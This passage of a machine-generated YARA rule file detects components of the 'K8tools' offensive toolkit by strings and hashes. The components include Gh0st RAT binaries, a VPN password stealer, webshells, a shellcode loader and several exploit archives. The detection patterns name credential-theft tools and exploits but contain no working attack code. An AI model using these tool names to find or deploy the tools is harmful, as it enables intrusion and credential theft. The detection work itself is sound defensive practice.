      $s1 = "onmlkj" fullword ascii /* reversed goodware string 'jklmno' */ /* score: '15.00'*/
      $s2 = "* +aUIP4\\*T" fullword ascii /* score: '12.42'*/
      $s3 = "<description>Your app description here</description> " fullword ascii /* score: '10.00'*/
      $s4 = "ScriptnackgBun" fullword ascii /* score: '10.00'*/
      $s5 = "LP'HOSTW?" fullword ascii /* score: '9.00'*/
      $s6 = "WM_4GETCONTR" fullword ascii /* score: '9.00'*/
      $s7 = "abcdefghijkklmn" fullword ascii /* score: '8.00'*/
      $s8 = "] '%I%" fullword ascii /* score: '8.00'*/
      $s9 = "Set-Cookie:!" fullword ascii /* score: '7.01'*/
      $s10 = "http://www.netbox.cn" fullword wide /* score: '7.00'*/
      $s11 = "tbl_!rootpagi9#$" fullword ascii /* score: '7.00'*/
      $s12 = "V_(c:\\" fullword ascii /* score: '7.00'*/
      $s13 = "SSES_ROOTy" fullword ascii /* score: '7.00'*/
      $s14 = "UUUUUUUUUUUUP" fullword ascii /* score: '6.50'*/
      $s15 = "O\\\\.\\Phys" fullword ascii /* score: '6.00'*/
      $s16 = "Copyright (C) 2003 ZYDSoft Corp." fullword wide /* score: '6.00'*/
      $s17 = "GetLay" fullword ascii /* score: '6.00'*/
      $s18 = "\\&+ plh" fullword ascii /* score: '6.00'*/
      $s19 = "Purrefa" fullword ascii /* score: '6.00'*/
      $s20 = "D}circu" fullword ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 2000KB and
      ( pe.imphash() == "f800ac67f4f1bcfe8c9c4579de16b1a1" or 8 of them )
}

rule K8_Gh0st_Bin {
   meta:
      description = "K8tools - file K8_Gh0st_Bin.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "2702c0fd8c40523315ba642a95e5b5adc6969d5f1328498bf245f48ac8a581e7"
   strings:
      $s1 = "K8_Gh0st_Bin\\SkinH.dll" fullword ascii /* score: '23.42'*/
      $s2 = "K8_Gh0st_Bin\\K8_Gh0st.exe" fullword ascii /* score: '15.42'*/
      $s3 = "K8_Gh0st_Bin\\ip.exe" fullword ascii /* score: '15.00'*/
      $s4 = "K8_Gh0st_Bin\\QQWry.Dat" fullword ascii /* score: '14.42'*/
      $s5 = "K8_Gh0st_Bin\\Server.dat" fullword ascii /* score: '14.00'*/
      $s6 = "Rget\"=" fullword ascii /* score: '9.00'*/
      $s7 = "@gvfbl: -" fullword ascii /* score: '8.00'*/
      $s8 = "K8_Gh0st_Bin\\K8_Gh0st.ini" fullword ascii /* score: '7.42'*/
      $s9 = "jCoMHn " fullword ascii /* score: '7.42'*/
      $s10 = "MaxConnectionAuto=0" fullword ascii /* score: '7.00'*/
      $s11 = "K&m:\\Z" fullword ascii /* score: '7.00'*/
      $s12 = "sCOMW3<X" fullword ascii /* score: '7.00'*/
      $s13 = "ListenPort=53" fullword ascii /* score: '7.00'*/
      $s14 = "wM7.wuzaAZ+" fullword ascii /* score: '7.00'*/
      $s15 = "utR.wQO" fullword ascii /* score: '7.00'*/
      $s16 = "wmR.fEt" fullword ascii /* score: '7.00'*/
      $s17 = "bO:\\Hh" fullword ascii /* score: '7.00'*/
      $s18 = "MaxConnection=8000" fullword ascii /* score: '7.00'*/
      $s19 = "-WH^%s-" fullword ascii /* score: '6.50'*/
      $s20 = "[%rAt(" fullword ascii /* score: '6.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 12000KB and
      8 of them
}

rule K8_TomcatExp_1124_K_8_ {
   meta:
      description = "K8tools - file K8_TomcatExp_1124[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c89df519b0a9802cd0121c776cd121da73b2c0b38576e09479df756e69483c8d"
   strings:
      $s1 = "K8_TocmatExp.exe\"" fullword ascii /* score: '11.00'*/
      $s2 = "UXHa;W=" fullword ascii /* score: '4.00'*/
      $s3 = "IGCpD{9%" fullword ascii /* score: '4.00'*/
      $s4 = "##~I 4" fullword ascii /* score: '1.00'*/
      $s5 = "f @eWT" fullword ascii /* score: '1.00'*/
      $s6 = "NsgQ|O" fullword ascii /* score: '1.00'*/
      $s7 = "h:003D" fullword ascii /* score: '1.00'*/
      $s8 = "`6$@+)M" fullword ascii /* score: '1.00'*/
      $s9 = "'(@iER" fullword ascii /* score: '1.00'*/
      $s10 = "~-4['a" fullword ascii /* score: '1.00'*/
      $s11 = ";g0EvW" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 20KB and
      8 of them
}

rule ms14_002_____________K8_ {
   meta:
      description = "K8tools - file ms14-002提权工具[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "f8a58cf686fe5609c5d5fd5ba225b8f95ec47798a246900cf336cae835acf5a0"
   strings:
      $s1 = "MS14-002.exe" fullword ascii /* score: '20.00'*/
      $s2 = "ms14-002_exploit.png" fullword ascii /* score: '11.00'*/
      $s3 = "|B=mgN:\"-" fullword ascii /* score: '7.00'*/
      $s4 = "Jeiy?A" fullword ascii /* score: '4.00'*/
      $s5 = "DTuzbWH" fullword ascii /* score: '4.00'*/
      $s6 = ".dwB?+" fullword ascii /* score: '4.00'*/
      $s7 = "WMbT!e" fullword ascii /* score: '4.00'*/
      $s8 = "{HNpdcsV" fullword ascii /* score: '4.00'*/
      $s9 = "hnJZt~M/d" fullword ascii /* score: '4.00'*/
      $s10 = "XjQW&|:&" fullword ascii /* score: '4.00'*/
      $s11 = "[wfqCNsQ" fullword ascii /* score: '4.00'*/
      $s12 = "anyS!}0u0" fullword ascii /* score: '4.00'*/
      $s13 = "/LMsqY`^" fullword ascii /* score: '4.00'*/
      $s14 = "oCeu62" fullword ascii /* score: '2.00'*/
      $s15 = "\\2?7NG" fullword ascii /* score: '2.00'*/
      $s16 = "9 Ph}V" fullword ascii /* score: '1.00'*/
      $s17 = "`b_gCR" fullword ascii /* score: '1.00'*/
      $s18 = "LzL<m91" fullword ascii /* score: '1.00'*/
      $s19 = "c!S[L6" fullword ascii /* score: '1.00'*/
      $s20 = "bJ)7_-" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 200KB and
      8 of them
}

rule WordPress_4_2_XSS_0day__20150429_K_8_ {
   meta:
      description = "K8tools - file WordPress 4.2 XSS 0day  20150429[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "96f512a5793463db12fcc273c3a56abb8fe90ea07f6948f7fa6aca779bb02700"
   strings:
      $s1 = "WordPress 4.2 0day [K.8].txt" fullword ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3KB and
      all of them
}

rule PortTran {
   meta:
      description = "K8tools - file PortTran.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a3768e127cc761068db97472bde59f35ac70ce7cc45c54cd3c2947c3a3bfc9fd"
   strings:
      $s1 = "PortTran\\S\\PortTranS\\bin\\Debug\\PortTranS.vshost.exe" fullword ascii /* score: '28.00'*/
      $s2 = "PortTran\\S\\PortTranS\\bin\\Debug\\PortTranS.vshost.exe.manifest" fullword ascii /* score: '24.00'*/
      $s3 = "PortTran\\img\\target.PNG" fullword ascii /* score: '20.00'*/
      $s4 = "PortTran\\C\\PortTranC35.exe" fullword ascii /* score: '18.00'*/
      $s5 = "PortTran\\C\\PortTranC30.exe" fullword ascii /* score: '18.00'*/
      $s6 = "PortTran\\C\\PortTranC40.exe" fullword ascii /* score: '18.00'*/
      $s7 = "PortTran\\C\\PortTranC20.exe" fullword ascii /* score: '18.00'*/
      $s8 = "PortTran\\C\\PortTranC46.exe" fullword ascii /* score: '18.00'*/
      $s9 = "PortTran\\C\\PortTranC45.exe" fullword ascii /* score: '18.00'*/
      $s10 = "PortTran\\S\\PortTranS20.exe" fullword ascii /* score: '18.00'*/
      $s11 = "PortTran\\S\\PortTranS40.exe" fullword ascii /* score: '18.00'*/
      $s12 = "PortTran\\S\\PortTranS46.exe" fullword ascii /* score: '18.00'*/
      $s13 = "PortTran\\S\\PortTranS45.exe" fullword ascii /* score: '18.00'*/
      $s14 = "PortTran\\S\\PortTranS35.exe" fullword ascii /* score: '18.00'*/
      $s15 = "PortTran\\S\\PortTranS30.exe" fullword ascii /* score: '18.00'*/
      $s16 = "PortTran\\S\\PortTranS\\obj\\x86\\Debug\\TempPE" fullword ascii /* score: '16.00'*/
      $s17 = "PortTran\\rem.txt" fullword ascii /* score: '14.00'*/
      $s18 = "PortTran\\S\\PortTranS\\bin" fullword ascii /* score: '12.00'*/
      $s19 = "PortTran\\S\\PortTranS\\bin\\Debug" fullword ascii /* score: '12.00'*/
      $s20 = "PortTran\\img\\vps.PNG" fullword ascii /* score: '10.17'*/
   condition:
      uint16(0) == 0x6152 and filesize < 700KB and
      8 of them
}

rule K8______Final_2 {
   meta:
      description = "K8tools - file K8飞刀Final.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "21c83dd2a756649f7ef2d88296cc71e1791d53437fd805c3475d7d2974d667a0"
   strings:
      $x1 = "\\K8tool\\K8shellcodeLoader.exe" fullword ascii /* score: '30.42'*/
      $s2 = "\\tmp\\exp_post_demo.exe" fullword ascii /* score: '24.42'*/
      $s3 = "\\tmp\\exp_get_demo.exe" fullword ascii /* score: '24.00'*/
      $s4 = "\\K8Result\\SqlInject.txt" fullword ascii /* score: '22.00'*/
      $s5 = "\\bin\\WinRAR.exe" fullword ascii /* score: '21.42'*/
      $s6 = "\\K8dic\\K8inject.mdb" fullword ascii /* score: '18.42'*/
      $s7 = "\\udf.dll" fullword ascii /* score: '18.00'*/
      $s8 = "\\downexec.mof" fullword ascii /* score: '16.00'*/
      $s9 = "\\Web-Exp\\joomla_1.5-3.45_getshell_exp.py" fullword ascii /* score: '15.00'*/
      $s10 = "\\XSS-CSRF\\Scripts\\jquery-1.4.1.min.js" fullword ascii /* score: '14.00'*/
      $s11 = "\\WebShell\\cmd.pl" fullword ascii /* score: '13.42'*/
      $s12 = "\\WebShell\\cmd.py" fullword ascii /* score: '13.42'*/
      $s13 = "\\K8dic\\K8user\\ftpuser.K8" fullword ascii /* score: '13.17'*/
      $s14 = "\\WebShell\\Picture\\k8.jpg" fullword ascii /* score: '13.17'*/
      $s15 = "\\K8dic\\K8pass\\FtpPass.K8" fullword ascii /* score: '13.17'*/
      $s16 = "\\WebShell\\1.cfm" fullword ascii /* score: '13.00'*/
      $s17 = "\\WebShell\\Picture\\1.JPG" fullword ascii /* score: '13.00'*/
      $s18 = "4-)/\\ -1" fullword ascii /* score: '13.00'*/ /* hex encoded string 'A' */
      $s19 = "\\bin\\Default.SFX" fullword ascii /* score: '13.00'*/
      $s20 = "\\K8fly.exe" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 18000KB and
      1 of ($x*) and 4 of them
}

rule K8tools_k8cmd_5 {
   meta:
      description = "K8tools - file k8cmd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b5a08c30adbdea4976ac07f346b8f8af13486aed913854dcd7c0c2a97f441315"
   strings:
      $x1 = "K8cmd.exe" fullword wide /* score: '31.00'*/
      $s2 = "VB5!6&vb6chs.dll" fullword ascii /* score: '17.00'*/
      $s3 = "VM60.DLL\\n" fullword ascii /* score: '16.00'*/
      $s4 = "i.baidu.com/qh*" fullword ascii /* score: '14.00'*/
      $s5 = "log http://h" fullword ascii /* score: '12.00'*/
      $s6 = "lineovig" fullword ascii /* score: '8.00'*/
      $s7 = "pRUN[.Y6Rfs" fullword ascii /* score: '7.00'*/
      $s8 = "hsPY1!" fullword ascii /* score: '6.00'*/
      $s9 = "Wdclaqs" fullword ascii /* score: '6.00'*/
      $s10 = "Comman" fullword ascii /* score: '6.00'*/
      $s11 = "CMD [K.8]" fullword wide /* score: '6.00'*/
      $s12 = "q;6- }.U" fullword ascii /* score: '5.00'*/
      $s13 = ":0 /s," fullword ascii /* score: '5.00'*/
      $s14 = "x- P+L2" fullword ascii /* score: '5.00'*/
      $s15 = "OtaupInfoA9 " fullword ascii /* score: '4.42'*/
      $s16 = "LThis p" fullword ascii /* score: '4.00'*/
      $s17 = "c='StrToUnicod" fullword ascii /* score: '4.00'*/
      $s18 = "soft Visual " fullword ascii /* score: '4.00'*/
      $s19 = "rogram Files\\Mic" fullword ascii /* score: '4.00'*/
      $s20 = "T.GHPult;RG" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 600KB and
      ( pe.imphash() == "064f35439a181be0288853445e7025c9" or ( 1 of ($x*) or 4 of them ) )
}

rule MSF_WordPress_N_Media_GetShell_EXP_K_8_ {
   meta:
      description = "K8tools - file MSF WordPress N-Media_GetShell EXP[K.8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "046b1e46a05f03a885fd6f669f0461e4b966de36d942da5e5bd122ab4012bbfc"
   strings:
      $s1 = "wp N-Media getshell.PNG" fullword ascii /* score: '17.00'*/
      $s2 = "WordPress_N-Media_1.3.4_K8GetShell.rb" fullword ascii /* score: '14.00'*/
      $s3 = "website-contact-form-with-file-upload.1.3.4.zip" fullword ascii /* score: '9.00'*/
      $s4 = ">,O~ -" fullword ascii /* score: '5.00'*/
      $s5 = "Uf=- z" fullword ascii /* score: '5.00'*/
      $s6 = "= /A#{" fullword ascii /* score: '5.00'*/
      $s7 = "65+ DY1" fullword ascii /* score: '5.00'*/
      $s8 = "olksbp" fullword ascii /* score: '5.00'*/
      $s9 = "dLWp@\\X5\"@" fullword ascii /* score: '4.17'*/
      $s10 = "6-,flep`77{" fullword ascii /* score: '4.00'*/
      $s11 = "gXHFwM-i" fullword ascii /* score: '4.00'*/
      $s12 = "=XlaO)X,-" fullword ascii /* score: '4.00'*/
      $s13 = "NwpPbP.Q" fullword ascii /* score: '4.00'*/
      $s14 = "`=odQH_fqC@u" fullword ascii /* score: '4.00'*/
      $s15 = "nAzYbw&[C" fullword ascii /* score: '4.00'*/
      $s16 = "FWQKj\\" fullword ascii /* score: '4.00'*/
      $s17 = "NuMl;ag" fullword ascii /* score: '4.00'*/
      $s18 = "fiZfObi&" fullword ascii /* score: '4.00'*/
      $s19 = "[LNwvU5ExK['" fullword ascii /* score: '4.00'*/
      $s20 = "hBUk%7z>" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule K8tools_0day {
   meta:
      description = "K8tools - file 0day.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4d97a32271ae88842a7fa54323aaedfe39cb02ab5c491624cb197c22b994a869"
   strings:
      $s1 = "VB5!6&vb6chs.dll" fullword ascii /* score: '17.00'*/
      $s2 = "C:\\Program Files\\Microsoft Visual Basic 6.0\\VB6.OLB" fullword ascii /* score: '13.00'*/
      $s3 = "VBA6.DLL" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s4 = "&$WYzN" fullword ascii /* score: '1.00'*/
      $s5 = "Ns$FPs" fullword ascii /* score: '1.00'*/
      $s6 = "020430Vb" fullword ascii /* score: '1.00'*/
      $s7 = "Qs*aQs" fullword ascii /* score: '1.00'*/
      $s8 = "0day Test" fullword ascii /* score: '1.00'*/
      $s9 = "5BspuRs" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 60KB and
      ( pe.imphash() == "86babccfcc8a723de19bc2dc04df6635" or all of them )
}

rule K8_FileHideImg {
   meta:
      description = "K8tools - file K8_FileHideImg.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e36ff95d82b4954806bc1b0d9763851b06342ec248dde8855cef3d4d9df547d4"
   strings:
      $s1 = "'s Blog  http://qqhack8.blog.163.com" fullword ascii /* score: '26.42'*/
      $s2 = "explorer http://qqhack8.blog.163.com" fullword wide /* score: '26.00'*/
      $s3 = "http://qqhack8.blog.163.com" fullword wide /* score: '26.00'*/
      $s4 = "explorer http://user.qzone.qq.com/396890445/blog/1224911955" fullword wide /* score: '25.00'*/
      $s5 = "K8skin.dll" fullword ascii /* score: '23.00'*/
      $s6 = "K8_FileHideImg.exe" fullword wide /* score: '19.00'*/
      $s7 = "VB5!6&vb6chs.dll" fullword ascii /* score: '17.00'*/
      $s8 = "IF ERRORLEVEL 1 ECHO no>k8result.txt" fullword wide /* score: '14.00'*/
      $s9 = "IF ERRORLEVEL 0 ECHO yes>k8result.txt" fullword wide /* score: '14.00'*/
      $s10 = "C:\\Program Files\\Microsoft Visual Basic 6.0\\VB6.OLB" fullword ascii /* score: '13.00'*/
      $s11 = "Command3" fullword ascii /* score: '13.00'*/
      $s12 = "@copy /b " fullword wide /* score: '12.42'*/
      $s13 = "\\k8result.txt" fullword wide /* score: '12.00'*/
      $s14 = "\\k8copy.bat" fullword wide /* score: '12.00'*/
      $s15 = "SkinH_GetColor" fullword ascii /* score: '9.00'*/
      $s16 = "cmd_Hide2Img" fullword ascii /* score: '7.00'*/
      $s17 = "\\k8qqkiss.skin" fullword wide /* score: '5.00'*/
      $s18 = "SkinH_SetTitleMenuBar" fullword ascii /* score: '4.00'*/
      $s19 = "SkinH_NineBlt" fullword ascii /* score: '4.00'*/
      $s20 = "SkinH_Detach" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 100KB and
      ( pe.imphash() == "7a4e1b6b5d2c4e8e760f671b6f3470c5" or 8 of them )
}

rule Usp10_______K8 {
   meta:
      description = "K8tools - file Usp10提权_K8.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "e647f99cafed1a8a5a4f93af525629486ef92b3737de52f2eeac2ed83356f91c"
   strings:
      $s1 = "_K8\\USP10.dll" fullword ascii /* score: '17.42'*/
      $s2 = "USP10.DLL" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s3 = "c2KAAf2B1" fullword ascii /* score: '4.00'*/
      $s4 = "}&Zjrf[[/" fullword ascii /* score: '4.00'*/
      $s5 = "\\Z(J&0 eD/`" fullword ascii /* score: '2.00'*/
      $s6 = "FaSXu6" fullword ascii /* score: '2.00'*/
      $s7 = "vp%8-+e" fullword ascii /* score: '1.00'*/
      $s8 = "v?}]w~" fullword ascii /* score: '1.00'*/
      $s9 = "&AKtLs" fullword ascii /* score: '1.00'*/
      $s10 = "7nW*}l" fullword ascii /* score: '1.00'*/
      $s11 = "75^MC." fullword ascii /* score: '1.00'*/
      $s12 = ".(|Y`B" fullword ascii /* score: '1.00'*/
      $s13 = "JPpO_?" fullword ascii /* score: '1.00'*/
      $s14 = "tED@I@" fullword ascii /* score: '1.00'*/
      $s15 = "8T@bOI&rc" fullword ascii /* score: '1.00'*/
      $s16 = "^k_:d$" fullword ascii /* score: '1.00'*/
      $s17 = "\"]2V-;Xm" fullword ascii /* score: '1.00'*/
      $s18 = "Y#~Fy\"" fullword ascii /* score: '1.00'*/
      $s19 = "DEFK\\X+" fullword ascii /* score: '0.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule ccproxy6_0____________exploit______________1020_K8_ {
   meta:
      description = "K8tools - file ccproxy6.0远程溢出exploit_各种语言_1020[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "c9feebd81cf31c95cc43f4da9e880d6aa34d9ea1872e8980c0d5f7db67929085"
   strings:
      $s1 = "for c++\\Debug\\CCProxyExploit.exe" fullword ascii /* score: '24.01'*/
      $s2 = "_K8team\\ccproxysetup.exe" fullword ascii /* score: '18.42'*/
      $s3 = "for c++\\CCProxyExploit.dsp" fullword ascii /* score: '14.01'*/
      $s4 = "for c++\\CCProxyExploit.dsw" fullword ascii /* score: '14.01'*/
      $s5 = "for c++\\CCProxyExploit.plg" fullword ascii /* score: '14.01'*/
      $s6 = "for c++\\CCProxyExploit.cpp" fullword ascii /* score: '14.01'*/
      $s7 = "_K8team\\CCproxyExploit.pl" fullword ascii /* score: '11.42'*/
      $s8 = "_K8team\\CCproxy6.0 exp python\\CCproxyExploit.py" fullword ascii /* score: '11.00'*/
      $s9 = "for c++\\CCProxyFindAddr.cpp" fullword ascii /* score: '10.01'*/
      $s10 = "* |;c|" fullword ascii /* score: '9.00'*/
      $s11 = "exploit_" fullword ascii /* score: '8.00'*/
      $s12 = "_K8team\\CCProxy6.0 " fullword ascii /* score: '7.42'*/
      $s13 = "_K8team\\CCproxy6.0 exp python" fullword ascii /* score: '7.00'*/
      $s14 = "ccproxy6.0" fullword ascii /* score: '7.00'*/
      $s15 = "DPJTOMV" fullword ascii /* score: '6.50'*/
      $s16 = "1cQftp" fullword ascii /* score: '6.00'*/
      $s17 = "mgaccp" fullword ascii /* score: '5.00'*/
      $s18 = "MU%GM%/G" fullword ascii /* score: '5.00'*/
      $s19 = "R* ]_U" fullword ascii /* score: '5.00'*/
      $s20 = "p}lr* o%" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 2000KB and
      8 of them
}

rule getvpnpwd {
   meta:
      description = "K8tools - file getvpnpwd.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1c668915a31bb42267edcde9e688cd7ca13e0c484e904aa53c4cad11245f74e4"
   strings:
      $x1 = "C:\\Users\\null\\Desktop\\getVpnAdslPass\\Release\\getvpnpwd.pdb" fullword ascii /* score: '38.00'*/
      $s2 = "Amscoree.dll" fullword wide /* score: '23.00'*/
      $s3 = "Get VPN Password" fullword ascii /* score: '17.00'*/
      $s4 = "Microsoft\\Network\\Connections\\pbk\\rasphone.pbk" fullword wide /* score: '10.00'*/
      $s5 = "Documents and Settings\\" fullword wide /* score: '9.00'*/
      $s6 = "L$_RasDefaultCredentials#0" fullword wide /* score: '9.00'*/
      $s7 = "Pass: %s" fullword wide /* score: '7.02'*/
      $s8 = "\\Application Data\\Microsoft\\Network\\Connections\\pbk\\rasphone.pbk" fullword wide /* score: '7.00'*/
      $s9 = ".?AVCDialupass@@" fullword ascii /* score: '7.00'*/
      $s10 = "Author: k8gege" fullword ascii /* score: '7.00'*/
      $s11 = "RasDialParams!%s#0" fullword wide /* score: '7.00'*/
      $s12 = "PhoneNumber: %s" fullword wide /* score: '4.02'*/
      $s13 = "Conn: %s" fullword wide /* score: '4.02'*/
      $s14 = "URPQQh@}@" fullword ascii /* score: '4.00'*/
      $s15 = "9#9(9.969;9A9I9N9T9\\9a9g9o9t9z9" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s16 = ": :(:0:4:<:P:X:l:" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s17 = "8K9t9}9" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s18 = "5*6D6`6" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s19 = "797>7]7" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s20 = "uPVWh6g@" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 200KB and
      ( pe.imphash() == "97be54ac375069db45e7c648a78b11e9" or ( 1 of ($x*) or 4 of them ) )
}

rule K8____________ {
   meta:
      description = "K8tools - file K8进程拦截.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "72099e684cf311c8111360443147e32fa4f507691afab34773d0be89f95041ec"
   strings:
      $s1 = "\\HookCreateProcess.exe" fullword ascii /* score: '27.00'*/
      $s2 = "\\exports.dll" fullword ascii /* score: '24.00'*/
      $s3 = "DAM -1" fullword ascii /* score: '5.00'*/
      $s4 = "RGsd~xP" fullword ascii /* score: '4.00'*/
      $s5 = "]RwO,," fullword ascii /* score: '1.00'*/
      $s6 = "W[fq@g<0" fullword ascii /* score: '1.00'*/
      $s7 = "`pb@kAa" fullword ascii /* score: '1.00'*/
      $s8 = "%f9V?B" fullword ascii /* score: '1.00'*/
      $s9 = "]C$(7mq" fullword ascii /* score: '1.00'*/
      $s10 = "v#g\"/8~" fullword ascii /* score: '1.00'*/
      $s11 = "z/Wb0ti" fullword ascii /* score: '1.00'*/
      $s12 = "}MtUk6[" fullword ascii /* score: '1.00'*/
      $s13 = "h/dI2W" fullword ascii /* score: '1.00'*/
      $s14 = "Xt:7}N" fullword ascii /* score: '1.00'*/
      $s15 = "$KpM~v" fullword ascii /* score: '1.00'*/
      $s16 = "0/\",VH" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 30KB and
      8 of them
}

rule K8tools_web_2 {
   meta:
      description = "K8tools - file web.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "480638e653075f5c4326a228dd34e83dbfbb296c03367e1a3157e08ddf907e35"
   strings:
      $s1 = "Failed to get address for PyImport_ExecCodeModule" fullword ascii /* score: '27.00'*/
      $s2 = "Failed to get address for Py_NoUserSiteDirectory" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to get executable path." fullword ascii /* score: '20.00'*/
      $s4 = "Failed to get address for Py_FileSystemDefaultEncoding" fullword ascii /* score: '18.00'*/
      $s5 = "Failed to get address for PyMarshal_ReadObjectFromString" fullword ascii /* score: '18.00'*/
      $s6 = "Failed to get address for PyRun_SimpleString" fullword ascii /* score: '18.00'*/
      $s7 = "Failed to get address for PyUnicode_Decode" fullword ascii /* score: '17.00'*/
      $s8 = "Failed to get address for PyUnicode_DecodeFSDefault" fullword ascii /* score: '17.00'*/
      $s9 = "Error loading Python DLL '%s'." fullword ascii /* score: '15.00'*/
      $s10 = "Failed to convert executable path to UTF-8." fullword ascii /* score: '15.00'*/
      $s11 = "Failed to get address for PyString_FromString" fullword ascii /* score: '15.00'*/
      $s12 = "Failed to get address for PyUnicode_FromFormat" fullword ascii /* score: '15.00'*/
      $s13 = "Failed to get address for PySys_GetObject" fullword ascii /* score: '15.00'*/
      $s14 = "Failed to get address for PyUnicode_FromString" fullword ascii /* score: '15.00'*/
      $s15 = "Failed to get address for Py_DecRef" fullword ascii /* score: '15.00'*/
      $s16 = "Failed to get address for Py_SetProgramName" fullword ascii /* score: '15.00'*/
      $s17 = "Failed to get address for PyLong_AsLong" fullword ascii /* score: '15.00'*/
      $s18 = "Failed to get address for PyEval_EvalCode" fullword ascii /* score: '15.00'*/
      $s19 = "Failed to get address for PyImport_ImportModule" fullword ascii /* score: '15.00'*/
      $s20 = "Failed to get address for Py_OptimizeFlag" fullword ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 12000KB and
      ( pe.imphash() == "4df47bd79d7fe79953651a03293f0e8f" or 8 of them )
}

rule K8Cscan5_4_20191101 {
   meta:
      description = "K8tools - file K8Cscan5.4_20191101.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "fe088be5ae11a716bf2c6ffa1d801528b5355c622ad76811a1b607c04e231af3"
   strings:
      $s1 = "ReadMe.txtT" fullword ascii /* score: '14.00'*/
      $s2 = "HT\"+ -3" fullword ascii /* score: '9.00'*/
      $s3 = "Cscan(.net_2x_3x).exeT" fullword ascii /* score: '9.00'*/
      $s4 = "* a;:0Nfw" fullword ascii /* score: '9.00'*/
      $s5 = "Cscan(.net_4x).exeT" fullword ascii /* score: '9.00'*/
      $s6 = "K8Cscan.gifT" fullword ascii /* score: '8.00'*/
      $s7 = "Y:\"b>?" fullword ascii /* score: '7.00'*/
      $s8 = "CobaltStrike.gifT" fullword ascii /* score: '7.00'*/
      $s9 = ":H/1%d-N" fullword ascii /* score: '6.50'*/
      $s10 = "NDll'<" fullword ascii /* score: '6.00'*/
      $s11 = "oD)E#- " fullword ascii /* score: '5.42'*/
      $s12 = "v0CR+ " fullword ascii /* score: '5.42'*/
      $s13 = "cD_6* " fullword ascii /* score: '5.42'*/
      $s14 = "- a#pl" fullword ascii /* score: '5.00'*/
      $s15 = "zp -Y E" fullword ascii /* score: '5.00'*/
      $s16 = "`Yd- }" fullword ascii /* score: '5.00'*/
      $s17 = "^ /LR@%" fullword ascii /* score: '5.00'*/
      $s18 = "%p%rDg#" fullword ascii /* score: '5.00'*/
      $s19 = "blmPYhW5" fullword ascii /* score: '5.00'*/
      $s20 = "\\MxKK@Y4" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 3000KB and
      8 of them
}

rule Ladon5_7 {
   meta:
      description = "K8tools - file Ladon5.7.rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "a9428836bdd0a967f0a9da1e38ddf7309a1ae6352a46d3f60e34a3d9788453ce"
   strings:
      $s1 = "exe=cmd.exe" fullword ascii /* score: '30.00'*/
      $s2 = "MoudleDemo\\C#\\dll\\WebBanner\\netscan\\bin\\Debug\\netscan.dll" fullword ascii /* score: '26.00'*/
      $s3 = "MoudleDemo\\C#\\dll\\PortScan\\netscan\\obj\\Debug\\netscan.dll" fullword ascii /* score: '26.00'*/
